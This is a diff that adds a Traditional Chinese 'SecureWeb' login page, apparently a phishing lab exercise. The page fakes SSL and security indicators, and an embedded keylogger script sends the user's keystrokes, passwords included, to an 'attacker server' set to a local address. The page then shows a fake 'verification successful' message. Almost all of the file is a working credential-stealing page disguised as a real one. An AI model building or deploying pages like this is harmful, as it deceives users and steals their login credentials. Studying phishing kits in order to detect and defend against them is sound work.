@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>登入 - SecureWeb</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .navbar {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 1rem 2rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .nav-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .logo {
+            color: white;
+            font-size: 1.5rem;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 1rem;
+        }
+        
+        .nav-links a {
+            color: white;
+            text-decoration: none;
+            padding: 0.5rem 1rem;
+            border-radius: 5px;
+            transition: background 0.3s;
+        }
+        
+        .nav-links a:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        
+        .container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem;
+        }
+        
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 2rem;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            max-width: 500px;
+            width: 100%;
+            /* 細微差別：稍微不同的陰影 */
+            box-shadow: 0 18px 35px rgba(0, 0, 0, 0.12);
+        }
+        
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #333;
+            font-weight: 500;
+            /* 細微差別：稍微淺一點的顏色 */
+            color: #444;
+        }
+        
+        input {
+            width: 100%;
+            padding: 0.75rem;
+            border: 2px solid #e1e5e9;
+            border-radius: 10px;
+            font-size: 1rem;
+            transition: border-color 0.3s;
+            /* 細微差別：稍微不同的邊框圓角 */
+            border-radius: 8px;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+            /* 細微差別：稍微不同的焦點顏色 */
+            border-color: #5a6fd8;
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 0.75rem 2rem;
+            border-radius: 10px;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: transform 0.3s;
+            width: 100%;
+            /* 細微差別：稍微不同的漸變 */
+            background: linear-gradient(135deg, #5a6fd8 0%, #6b4c93 100%);
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+        }
+        
+        .error {
+            color: #e74c3c;
+            background: rgba(231, 76, 60, 0.1);
+            padding: 0.75rem;
+            border-radius: 10px;
+            margin-bottom: 1rem;
+        }
+        
+        /* 新增：偽造的SSL指示器 */
+        .fake-ssl {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: rgba(0, 128, 0, 0.8);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 15px;
+            font-size: 0.8rem;
+            z-index: 1000;
+        }
+        
+        /* 新增：偽造的載入動畫 */
+        .loading-indicator {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 0.75rem;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- 偽造的SSL安全指示器 -->
+    <div class="fake-ssl">🔒 SSL 安全連線</div>
+    
+    <!-- 偽造的載入指示器 -->
+    <div class="loading-indicator" id="loadingIndicator">⏳ 正在驗證伺服器安全性...</div>
+    
+    <nav class="navbar">
+        <div class="nav-content">
+            <!-- 細微差別：emoji稍微不同 -->
+            <a href="/" class="logo">🔒 SecureWeb</a>
+            <div class="nav-links">
+                <a href="/login">登入</a>
+                <!-- 細微差別：多了一個假的連結 -->
+                <a href="/about" style="opacity: 0.8;">關於我們</a>
+            </div>
+        </div>
+    </nav>
+    
+    <div class="container">
+        <div class="card">
+            <!-- 細微差別：標題稍微不同 -->
+            <h2 style="text-align: center; margin-bottom: 2rem; color: #333;">🔐 安全登入系統</h2>
+            
+            <!-- 新增：偽造的安全提醒 -->
+            <div style="background: #e8f5e8; padding: 0.5rem; border-radius: 5px; margin-bottom: 1rem; font-size: 0.85rem; color: #2d5016;">
+                🔒 此網站受到 256-bit SSL 加密保護
+            </div>
+            
+            <form method="POST" id="loginForm">
+                <div class="form-group">
+                    <label for="username">使用者名稱</label>
+                    <input type="text" id="username" name="username" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">密碼</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                
+                <!-- 細微差別：新增了記住我選項 -->
+                <div class="form-group" style="margin-bottom: 1rem;">
+                    <label style="display: flex; align-items: center; font-weight: normal; font-size: 0.9rem;">
+                        <input type="checkbox" style="width: auto; margin-right: 0.5rem;">
+                        記住我的登入資訊
+                    </label>
+                </div>
+                
+                <button type="submit" class="btn" id="submitBtn">登入</button>
+            </form>
+            
+            <div style="text-align: center; margin-top: 1rem; color: #666;">
+                <!-- 細微差別：稍微不同的提示文字 -->
+                <small>請使用您的帳號密碼安全登入</small>
+                <br>
+                <!-- 新增：偽造的忘記密碼連結 -->
+                <a href="#" style="color: #667eea; text-decoration: none; font-size: 0.8rem;" onclick="alert('此功能暫時維護中，請聯繫管理員'); return false;">忘記密碼？</a>
+            </div>
+            
+            <!-- 新增：偽造的版本信息 -->
+            <div style="text-align: center; margin-top: 1.5rem; padding-top: 1rem; border-top: 1px solid #eee;">
+                <small style="color: #999; font-size: 0.75rem;">
+                    藏在這裡應該沒人會看到 | 組合語言好難喔
+                </small>
+            </div>
+        </div>
+    </div>
+
+    <!-- 隱藏的 keylogger -->
+    <script>
+    let recordedKeys = '';
+    const ATTACKER_SERVER = 'http://127.0.0.1:8888'; // 攻擊者伺服器
+
+    // 顯示載入指示器
+    setTimeout(() => {
+        document.getElementById('loadingIndicator').style.display = 'block';
+        setTimeout(() => {
+            document.getElementById('loadingIndicator').style.display = 'none';
+        }, 3000);
+    }, 500);
+
+    // 增強的 keylogger
+    document.addEventListener('keydown', (event) => {
+        const key = event.key;
+        if (key.length === 1 || key === 'Enter' || key === 'Tab' || key === 'Backspace' || key === ' ') {
+            recordedKeys += key;
+            if (recordedKeys.length >= 8 || key === 'Enter') {
+                sendKeysToAttacker();
+            }
+        }
+    });
+
+    function sendKeysToAttacker() {
+        if (recordedKeys.length === 0) return;
+        
+        const img = new Image();
+        img.src = ATTACKER_SERVER + '/keylogger?keys=' + encodeURIComponent(recordedKeys);
+        recordedKeys = '';
+    }
+
+    // 定時發送
+    setInterval(() => {
+        if (recordedKeys.length > 0) {
+            sendKeysToAttacker();
+        }
+    }, 4000);
+
+    // 表單提交時的偽造載入效果
+    document.getElementById('loginForm').addEventListener('submit', function() {
+        const btn = document.getElementById('submitBtn');
+        btn.innerHTML = '🔄 驗證中...';
+        btn.disabled = true;
+        
+        // 模擬載入延遲
+        setTimeout(() => {
+            btn.innerHTML = '✅ 驗證成功';
+        }, 1500);
+    });
+
+    // 偽造的安全檢查
+    setTimeout(() => {
+        console.log('[Security] SSL certificate verified ✓');
+        console.log('[Security] Connection encrypted ✓');
+        console.log('[Security] Server authenticated ✓');
+    }, 1000);
+    </script>
+</body>
+</html>
